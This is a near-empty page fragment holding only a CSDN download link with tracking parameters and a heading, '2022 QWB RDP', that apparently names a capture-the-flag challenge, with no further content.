https://download.csdn.net/download/weixin_41604634/20627527?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-download-2%7Edefault%7EOPENSEARCH%7EPaid-1-20627527-blog-110419492.235%5Ev39%5Epc_relevant_3m_sort_dl_base3&depth_1-utm_source=distribute.pc_relevant_t0.none-task-download-2%7Edefault%7EOPENSEARCH%7EPaid-1-20627527-blog-110419492.235%5Ev39%5Epc_relevant_3m_sort_dl_base3&utm_relevant_index=1



## 2022 QWB RDP










